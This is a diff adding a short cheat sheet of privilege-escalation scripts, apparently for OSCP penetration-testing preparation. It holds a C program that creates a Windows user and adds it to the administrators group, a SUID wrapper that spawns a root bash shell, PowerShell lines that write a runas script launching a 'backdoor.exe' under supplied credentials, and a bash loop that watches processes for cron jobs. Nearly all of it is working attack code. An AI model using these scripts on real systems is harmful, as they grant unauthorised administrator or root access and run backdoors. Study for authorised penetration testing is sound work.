@@ -1,0 +1,50 @@
+# Scripts useful during privilege escalation phase (https://scund00r.com/all/oscp/2018/02/25/passing-oscp.html#enumeration)
+
+## Windows - Add user.
+  ###useradd.c
+  #include <stdlib.h> /* system, NULL, EXIT_FAILURE */
+
+  int main ()
+  {
+    int i;
+    i=system ("net user <username> <password> /add && net localgroup administrators <username> /add");
+    return 0;
+  }
+
+  #### Compile
+  i686-w64-mingw32-gcc -o useradd.exe useradd.c
+
+## SUID
+  ### Set owner user ID.
+  int main(void){
+    setresuid(0, 0, 0);
+    system("/bin/bash");
+  }
+
+  # Compile
+  gcc suid.c -o suid
+
+## Powershell Run as
+  ### Run file as another user with powershell.
+  echo $username = '<username>' > runas.ps1
+  echo $securePassword = ConvertTo-SecureString "<password>" -AsPlainText -Force >> runas.ps1
+  echo $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword >> runas.ps1
+  echo Start-Process C:\Users\User\AppData\Local\Temp\backdoor.exe -Credential $credential >> runas.ps1
+
+## Process Monitor
+
+  ### Monitor processes to check for running cron jobs.
+  #!/bin/bash
+
+  # Loop by line
+  IFS=$'\n'
+
+  old_process=$(ps -eo command)
+
+  while true; do
+    new_process=$(ps -eo command)
+    diff <(echo "$old_process") <(echo "$new_process") | grep [\<\>]
+    sleep 1
+    old_process=$new_process
+  done
+---------------------------------------------------------------------------------------------------------
